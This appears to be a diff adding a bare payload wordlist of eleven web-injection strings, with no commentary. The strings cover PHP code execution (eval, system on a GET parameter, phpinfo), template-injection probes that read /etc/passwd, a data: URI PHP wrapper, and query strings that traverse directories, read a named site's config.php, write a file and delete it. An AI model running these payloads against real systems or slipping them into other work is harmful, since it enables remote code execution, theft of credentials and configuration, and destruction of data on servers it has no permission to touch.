@@ -1,0 +1,11 @@
+${@print(THINK_VERSION)}
+${@phpinfo()}
+{${system($_GET['x'])}}?x=ls -al
+$%7B@print(eval($_POST[c]))%7D
+{{eval('123+123')}}
+{{open('/etc/passwd').read()}}
+a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E
+q=${@exit(print_r(scandir($_GET[d])))}&d=../../../
+q=${@exit(print_r(file($_GET[d])))}&d=../../../51cto.com/tool/config.php
+q=${@exit(var_dump(file_put_contents($_GET[n],$_GET[d])))}&d=by:wooyun.org&n=./../wooyun.org.txt
+q=${@exit(var_dump(unlink($_GET[n])))}&n=./../wooyun.org.txt
